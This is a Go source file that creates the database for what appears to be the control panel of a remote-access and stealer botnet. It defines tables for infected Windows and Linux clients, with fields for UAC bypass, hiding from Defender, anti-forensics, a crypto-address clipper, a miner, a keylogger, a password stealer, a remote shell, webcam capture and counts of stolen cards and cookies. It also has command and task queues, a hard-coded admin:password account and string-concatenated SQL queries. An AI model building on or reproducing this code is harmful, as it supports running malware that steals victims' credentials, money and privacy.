package core

import (
	"database/sql"
	"fmt"
	"log"
)

func GetSpecificSQL(table string, column string, selected string, selectedValue string) string {
	var outputData string
	Err = DB.QueryRow("SELECT "+column+"  FROM "+table+" where "+selected+" = ?", selectedValue).Scan(&outputData)
	if Err != nil {
		return " "
	}
	return outputData
}

func countRows(table string) int {
	var val int
	rows := DB.QueryRow("SELECT COUNT(*) as count FROM " + table)
	_ = rows.Scan(&val)
	return val
}

func AutoSetupDB() {
	// Create tables if not exist
	queries := []string{
		`CREATE TABLE IF NOT EXISTS admins (
			id INT AUTO_INCREMENT PRIMARY KEY,
			Username VARCHAR(255),
			Password VARCHAR(255),
			Salt VARCHAR(255),
			LastIP VARCHAR(50),
			LastLogin VARCHAR(100),
			Notes TEXT
		)`,
		`CREATE TABLE IF NOT EXISTS settings (
			id INT AUTO_INCREMENT PRIMARY KEY,
			Name VARCHAR(255),
			Value TEXT
		)`,
		`CREATE TABLE IF NOT EXISTS windows_clients (
			UID VARCHAR(255) PRIMARY KEY, ClientVersion VARCHAR(50), IP VARCHAR(50), Flag VARCHAR(10), OperatingSystem VARCHAR(255), GPU VARCHAR(255), Abilities TEXT, SysInfo TEXT, PingTime VARCHAR(10), Jitter VARCHAR(10), UserAgent TEXT, InstanceKey VARCHAR(255), Install VARCHAR(10), SmartCopy VARCHAR(10), InstallName VARCHAR(255), InstallFolder VARCHAR(255), Campaign VARCHAR(10), AntiForensics VARCHAR(10), AntiForensicsResponse VARCHAR(10), UACBypass VARCHAR(10), Guardian VARCHAR(10), DefenceSystem VARCHAR(10), ACG VARCHAR(10), HideFromDefender VARCHAR(10), AntiProcessWindow VARCHAR(10), AntiProcess VARCHAR(10), BlockTaskManager VARCHAR(10), AntiVirus TEXT, ClipperState VARCHAR(10), BTC VARCHAR(255), XMR VARCHAR(255), ETH VARCHAR(255), Custom VARCHAR(255), Regex TEXT, MinerState VARCHAR(10), Socks5State VARCHAR(10), ReverseProxyState VARCHAR(10), RemoteShellState VARCHAR(10), KeyloggerState VARCHAR(10), FileHunterState VARCHAR(10), PasswordStealerState VARCHAR(10), Screenshot VARCHAR(10), Webcam VARCHAR(10), Notes TEXT, LastResponse VARCHAR(100), FirstSeen VARCHAR(100), PasswordCount VARCHAR(10), CookieCount VARCHAR(10), CCCount VARCHAR(10)
		)`,
		`CREATE TABLE IF NOT EXISTS linux_clients (
			UID VARCHAR(255) PRIMARY KEY, ClientVersion VARCHAR(50), IP VARCHAR(50), Flag VARCHAR(10), OperatingSystem VARCHAR(255), GPU VARCHAR(255), Abilities TEXT, SysInfo TEXT, PingTime VARCHAR(10), Jitter VARCHAR(10), UserAgent TEXT, InstanceKey VARCHAR(255), Install VARCHAR(10), SmartCopy VARCHAR(10), InstallName VARCHAR(255), InstallFolder VARCHAR(255), Campaign VARCHAR(10), AntiForensics VARCHAR(10), AntiForensicsResponse VARCHAR(10), UACBypass VARCHAR(10), Guardian VARCHAR(10), DefenceSystem VARCHAR(10), ACG VARCHAR(10), HideFromDefender VARCHAR(10), AntiProcessWindow VARCHAR(10), AntiProcess VARCHAR(10), BlockTaskManager VARCHAR(10), AntiVirus TEXT, ClipperState VARCHAR(10), BTC VARCHAR(255), XMR VARCHAR(255), ETH VARCHAR(255), Custom VARCHAR(255), Regex TEXT, MinerState VARCHAR(10), Socks5State VARCHAR(10), ReverseProxyState VARCHAR(10), RemoteShellState VARCHAR(10), KeyloggerState VARCHAR(10), FileHunterState VARCHAR(10), PasswordStealerState VARCHAR(10), Screenshot VARCHAR(10), Webcam VARCHAR(10), Notes TEXT, LastResponse VARCHAR(100), FirstSeen VARCHAR(100), PasswordCount VARCHAR(10), CookieCount VARCHAR(10), CCCount VARCHAR(10)
		)`,
		`CREATE TABLE IF NOT EXISTS commands (
			id INT AUTO_INCREMENT PRIMARY KEY,
			UID VARCHAR(255),
			DAT VARCHAR(50),
			Command VARCHAR(255),
			Parameters TEXT,
			Status VARCHAR(50),
			DateIssued VARCHAR(100),
			Timeout VARCHAR(50)
		)`,
		`CREATE TABLE IF NOT EXISTS tasks (
			id INT AUTO_INCREMENT PRIMARY KEY,
			RandomID VARCHAR(255),
			TaskName VARCHAR(255),
			DateIssued VARCHAR(100),
			CommandName VARCHAR(255),
			Executions VARCHAR(10),
			MaxExecutions VARCHAR(10),
			TaskTimeout VARCHAR(50)
		)`,
	}

	for _, q := range queries {
		_, err := DB.Exec(q)
		if err != nil {
			log.Printf("[!] Error creating table: %v", err)
		}
	}

	// Insert default admin if not exists (Username: admin / Password: password)
	// Hash is md5(salt + "+" + password)
	var count int
	DB.QueryRow("SELECT COUNT(*) FROM admins").Scan(&count)
	if count == 0 {
		_, _ = DB.Exec("INSERT INTO admins (Username, Password, Salt) VALUES ('admin', 'd93591bdf7860e1e4ee2fca799911215', 'default')")
		log.Println("[*] Default admin created (admin:password)")
	}
	
	// Default Settings
	DB.QueryRow("SELECT COUNT(*) FROM settings").Scan(&count)
	if count == 0 {
		_, _ = DB.Exec("INSERT INTO settings (Name, Value) VALUES ('EncryptionKey', 'MTIzNDU2Nzg5MA==')") // "1234567890" base64
		_, _ = DB.Exec("INSERT INTO settings (Name, Value) VALUES ('UserAgent', 'TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQ7IFRyaWRlbnQvNy4wOyBUb3VjaDsgcnY6MTEuMCkgbGlrZSBHZWNrbw==')")
		_, _ = DB.Exec("INSERT INTO settings (Name, Value) VALUES ('Notes', 'V2VsY29tZSB0byBQcm9qZWN0IFdoaXM=')")
	}
}
